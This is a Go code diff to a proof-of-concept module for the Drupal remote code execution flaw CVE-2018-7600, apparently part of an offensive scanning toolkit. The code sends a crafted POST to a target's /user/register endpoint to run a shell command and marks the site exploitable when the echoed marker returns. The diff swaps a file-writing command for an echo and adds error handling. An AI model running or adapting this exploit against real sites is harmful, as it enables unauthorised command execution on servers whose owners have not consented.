@@ -1,7 +1,6 @@
 package poc
 
 import (
-	"fmt"
 	"io/ioutil"
 	"net/http"
 	"net/url"
@@ -13,7 +12,6 @@ import (
 
 // DrupalRCE - CVE-2018-7600
 type DrupalRCE struct {
-	mconn       *muxConn
 	target      string
 	Exploitable bool
 }
@@ -24,9 +22,8 @@ func NewDrupalRCE() *DrupalRCE {
 }
 
 // Set implements PoC interface.
-// Params should be {conn *websocket.Conn, target string}
+// Params should be {target string}
 func (d *DrupalRCE) Set(v ...interface{}) {
-	// d.mconn = &muxConn{conn: v[0].(*websocket.Conn)}
 	d.target = v[0].(string)
 }
 
@@ -43,10 +40,11 @@ func (d *DrupalRCE) Report() map[string]interface{} {
 func (d *DrupalRCE) Run() {
 	logger.Green.Println("Checking Drupal RCE (CVE-2018-7600)...")
 	d.check()
+	logger.Blue.Println(d.target, d.Exploitable)
 }
 
 func (d *DrupalRCE) check() {
-	cmd := `echo ";-)" | tee helllo.txt`
+	cmd := `echo "AssassinGooo"`
 	payload := url.Values{}
 	payload.Add("form_id", "user_register_form")
 	payload.Add("_drupal_ajax", "1")
@@ -57,10 +55,13 @@ func (d *DrupalRCE) check() {
 	client := &http.Client{
 		Timeout: 5 * time.Second,
 	}
-	req, _ := http.NewRequest("POST",
+	req, err := http.NewRequest("POST",
 		"http://"+d.target+"/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
 		strings.NewReader(payload.Encode()))
-
+	if err != nil {
+		logger.Red.Println(err)
+		return
+	}
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0")
 
@@ -71,5 +72,8 @@ func (d *DrupalRCE) check() {
 	}
 	body, _ := ioutil.ReadAll(resp.Body)
 	resp.Body.Close()
-	fmt.Println(string(body))
+
+	if strings.Contains(string(body), "AssassinGooo") {
+		d.Exploitable = true
+	}
 }
